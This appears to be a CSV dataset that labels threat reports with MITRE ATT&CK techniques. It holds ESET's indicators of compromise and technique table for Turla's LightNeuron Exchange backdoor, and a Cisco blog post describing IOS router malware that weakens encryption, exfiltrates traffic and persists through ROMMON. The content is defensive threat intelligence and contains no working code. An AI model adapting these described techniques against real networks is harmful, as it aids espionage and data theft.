url,mitre_domain,tactic_name,tech_name,tech_id,text,software_id
GDATA, “Uroburos – Deeper travel into kernel protection mitigation,” 07 03 2014. [Online].
Available:
https://www gdatasoftware com/blog/2014/03/23966-uroburos-deeper-travel-into-kernel-protection-mitigation
.
16
ESET, “Turla Outlook Backdoor,” 08 2018. [Online]. Available:
https://www welivesecurity com/wp-content/uploads/2018/08/Eset-Turla-Outlook-Backdoor pdf
.
17
GReAT, “APT Trends Report Q2 2018,” Kaspersky Labs, 10 06 2018. [Online]. Available:
https://securelist com/apt-trends-report-q2-2018/86487/
.
18
Microsoft, “Transport agents,” 01 06 2016. [Online]. Available:
https://docs microsoft com/en-us/exchange/transport-agents-exchange-2013-help
.
19
Mozilla, “What is the winmail.dat attachment?,” [Online].
Available:
https://support mozilla org/en-US/kb/what-winmaildat-attachment
.
20
Microsoft, “The Z3 Theorem Prover,” [Online]. Available:
https://github com/Z3Prover/z3
.
21
D. Strome, “Configure the Pickup directory and the Replay directory,” 12 08 2016. [Online]. Available:
https://
docs microsoft com/en-us/exchange/configure-the-pickup-directory-and-the-replay-directory-exchange-2013-help
.,Turla LightNeuron
One email away from remote code execution32
22
D. Strome, “Pickup directory and Replay directory,” 08 12 2016. [Online]. Available:
https://docs microsoft com/en-us/exchange/pickup-directory-and-replay-directory-exchange-2013-help
.
23
M. Schlee, “Hackers used Outlook for cyberattack on German government: report,” Politico, 06 03 2018. [Online].
Available:
https://www politico eu/article/report-hackers-used-outlook-for-cyberattack-on-german-government/
.
8.
IOCS
8.1 Hashes
In order to avoid breaking a compromised Microsoft Exchange server, please read the
Cleaning section
before
deleting any of the LightNeuron files.
SHA1 hash
3C851E239FBF67A03E0DAE8F63EEE702B330DB6C
Filename
Microsoft.Exchange.Security.Interop.dll
Component
Transport Agent
Compilation date
26/10/2016
ESET Detection Name
MSIL/Turla.A
SHA1 hash
76EE1802A6C920CBEB3A1053A4EC03C71B7E46F8
Filename
exrwdb.dll
Component
Companion DLL
Compilation date
02/09/2016
ESET Detection Name
Win64/Turla.CC
SHA1 hash
FF28B53B55BC77A5B4626F9DB856E67AC598C787
Filename
Microsoft.Exchange.MessagingPolicies.Search.dll
Component
Transport Agent
Compilation date
16/08/2015
ESET Detection Name
MSIL/Turla.A
SHA1 hash
C1FF6804FDB8656AB08928D187837D28060A552F
Filename
BPA.Transport.dll
Component
Companion DLL
Compilation date
25/07/2014
ESET Detection Name
Win64/Turla.CC
SHA1 hash
F9D52BB5A30B42FC2D1763BE586CEE8A57424732
Filename
Microsoft.Exchange.MessagingPolicies.Search.exe
Component
Transport Agent
Compilation date
20/06/2014
ESET Detection Name
MSIL/Turla.A
SHA1 hash
0A9F10925AF42DF94925D07112F303D57392C908
Filename
BPA.Transport.dll
Component
Companion DLL
Compilation date
01/07/2016
ESET Detection Name
Win64/Turla.CC
SHA1 hash
A4D1A34FE5EFFD90CCB6897679586DDC07FBC5CD
Filename
/
Component
Transport Agent
Compilation date
20/06/2014
ESET Detection Name
MSIL/Turla.A,Turla LightNeuron
One email away from remote code execution33
8.2 Paths
•
%tmp%
\winmail.dat
• C:\Windows\ServiceProfiles\NetworkService\appdata\Local\Temp\msmocf.xml
• C:\Windows\ServiceProfiles\NetworkService\appdata\Local\Temp\msmodl.dat
• C:\Windows\serviceprofiles\networkservice\appdata\Roaming\Microsoft\
Windows\814ad43-58ab-2cd3-3e68-b82a8f402fd0
• C:\Windows\serviceprofiles\networkservice\appdata\Roaming\Microsoft\
Windows\42cf8a1-6e20-8c24-d35f-82c46d8b70ba
• C:\Windows\serviceprofiles\networkservice\appdata\Roaming\Microsoft\
Windows\36b1f4a-82b9-eb06-7c1e-90b4b2d5c27d
• C:\Windows\ServiceProfiles\NetworkService\AppData\Roaming\Microsoft\thumbcache_idx.db
• C:\Windows\ServiceProfiles\NetworkService\AppData\Roaming\Microsoft\Windows\thumbcache_32.db
9.
MITRE ATT&CK TECHNIQUES
TacticIdNameDescription
Initial AccessT1078Valid AccountsAttackers probably re-used stolen credentials
to deploy LightNeuron.
ExecutionT1086PowerShellA PowerShell script was used to install LightNeuron.
Privilege
EscalationT1078Valid AccountsTo have Administrative rights, attackers probably
used stolen credentials.
DiscoveryT1016System Network
Configuration DiscoveryLightNeuron exfiltrates the result of the functions
GetAdaptersInfo and GetComputerName.
CollectionT1119Automated CollectionDepending on the configuration, LightNeuron
can collect the files in a specific path.
T1005Data from Local SystemUsing a backdoor function, attackers can exfiltrate
any local file.
T1114Email CollectionLightNeuron collects all the emails matching one rules
specified in its configuration.
ExfiltrationT1020Automated ExfiltrationDepending on the configuration, LightNeuron
can exfiltrate files located in a specific path.
T1022Data EncryptedData is encrypted using AES.
T1041Exfiltration Over
Command and Control
ChannelData is exfiltratated using an email C&C channel.
T1029Scheduled Transfer Depending on the configuration, automatic exfiltration
can happen during the night or during working hours.
Command
and ControlT1001Data ObfuscationC&C data is hidden in PDF documents or JPG images
using steganography.
T1032Standard Cryptographic
ProtocolC&C data is encrypted using AES.
T1071Standard Application
Layer ProtocolC&C communication uses emails.",['S0395']
https://blogs.cisco.com/security/evolution-of-attacks-on-cisco-ios-devices,"['enterprise-attack', 'Enterprise']","['defense-evasion', 'persistence', 'command-and-control', 'execution']","['Reduce Key Space', 'Weaken Encryption', 'Traffic Signaling', 'Network Device CLI', 'ROMMONkit', 'Non-Application Layer Protocol', 'Downgrade System Image', 'Modify System Image: Patch System Image']","['T1600.001', 'T1600', 'T1205', 'T1059.008', 'T1542.004', 'T1095', 'T1601.002', 'T1601', 'T1601', 'T1601', 'T1601', 'T1601', 'T1601']","
Evolution of attacks on Cisco IOS devices - Cisco Blogs
Skip to content
Cisco Blogs / Security / Evolution of attacks on Cisco IOS devices
October 8, 2015
8 Comments
Security
Evolution of attacks on Cisco IOS devices
Graham Holmes
While “SYNful Knock” is the latest identified malware targeting Cisco devices running Cisco IOS, we have identified and investigated six other malware incidents during the last four years that target Cisco devices running Cisco IOS. The nature of threats is evolving and Cisco will continue to adapt technology delivering trustworthy solutions that our customers can rely on. This also means that customers will need to evolve, fully utilizing the security tools that are available, as well as ensuring security best practices are in place.
The malware used in these evolved Cisco IOS attacks show increasing levels of complexity in the type of modifications made to Cisco IOS, the behavior of its Command and Control (C&C) network (when present), and the platforms they target.
Before talking about specifics of each investigated malware incident, it is important to note that in all cases, no evidence has been found that attackers exploited a previously known or unknown vulnerability to install the malware. All available data points suggest either the use of compromised administrator credentials or physical access to the devices or images.
The following table and associated description provides a brief overview of the malware samples, as well as an overview of the actions that Cisco took in response to those findings. The source of this information is internal analysis performed by Cisco forensics teams.
Notes to table:
INFECTION METHOD: Static means “modifications to the IOS binary stored in the device’s flash”, Runtime means “modifications performed to the runtime memory code without changes to the IOS binary in flash”
REMOTE DETECTABILITY: refers to the means to remotely look for the presence of the malware on a compromised system through scanning systems and signatures. Other means of detecting modifications through memory analysis is possible in all cases.
Incidents 0 and 1
The first two incidents were detected in 2011 and 2012 respectively, and were most likely custom malware targeting a specific victim. Those incidents were very basic (from a technical point of view) and involve binary patches to a Cisco IOS image. They allowed the modified IOS image file to be installed on the target routers (C3825, C2800nm, and C3845). Devices affected were in the Cisco 2800 and 3800 family of routers. No other Cisco devices were identified as affected by this malware.
The modification essentially affects the Diffie-Hellman key exchange protocol in order to weaken the derived keying material. The result is that with casual inspection the encrypted traffic seems unmodified, but the effect is that an attacker could decrypt protected traffic with less effort than would normally be required.
Platforms implementing Trust Anchor technologies and signed binaries would not be affected by either one of those two malware examples.
Incidents 2 and 3
Two new malware samples were identified in 2013, both targeting the Cisco 7600 series of devices. In both cases, the attacker leveraged compromised administrator credentials to modify the in-memory copy of the Cisco IOS code, using debugging and troubleshooting Cisco IOS command line interface (CLI) commands.
The primary purpose of the added code appears to be exfiltration of IPv4 packets that match criteria set by the attacker. The targeted traffic is copied and those packets are then forwarded to a specified IP address that is under the control of the attacker. A secondary purpose is to provide NAT (Network Address Translation) capabilities, so an attacker is able to access an IPv4 address within a compromised network that would normally not be reachable from the public Internet (ie: devices using RFC-1918 addresses).
Since both of these malware samples involved the modification of the in-memory code for Cisco IOS, neither Trust Anchor technologies nor image validation features would have detected or prevented the attack. But, because the modifications were performed on the in-memory copy of Cisco IOS, neither attack would achieve persistency across device reloads.
Incident 3 has only been detected in a single customer network. It was discovered while troubleshooting crashes on line cards on installed Cisco 7600 devices. Forensic analysis of the associated core dumps found that this attack used a C&C mechanism similar to Incident 2 to provide the malware with instructions for data exfiltration. What is unique in this incident is targeting of multi-architecture line cards – something we have not seen in any other malware analyzed as of this writing.
In both cases, the modifications were made to the in-memory copy of the executable code for the Cisco IOS image (with no changes to the actual binary Cisco IOS image in flash). The use of signed Cisco IOS images would not be a defense. It does, however, highlight the need for strong protection of administrative credentials and authorization mechanisms for privileged access to any network device.
Incident 4
Incident 4 was discovered in late 2014 and affected Cisco 1800, Cisco 3800 and Cisco 7200 devices. Like the malware seen in Incidents 2 and 3, the attack leveraged compromised administrative credentials to gain access to target devices for the purpose of installing the malware.
This malware, however, showed an increase in complexity compared to previous malware analyzed. It is the only analyzed malware so far that is capable of persistence through both device reload as well as through Cisco IOS software upgrades.
The malware has two separate components:
An initial infection, where the ROMMON on the targeted Cisco device is modified to ensure persistence of the C&C channel;
A secondary infection occurs when the ROMMON is used to inject binary code into the in-memory Cisco IOS image to support data exfiltration.
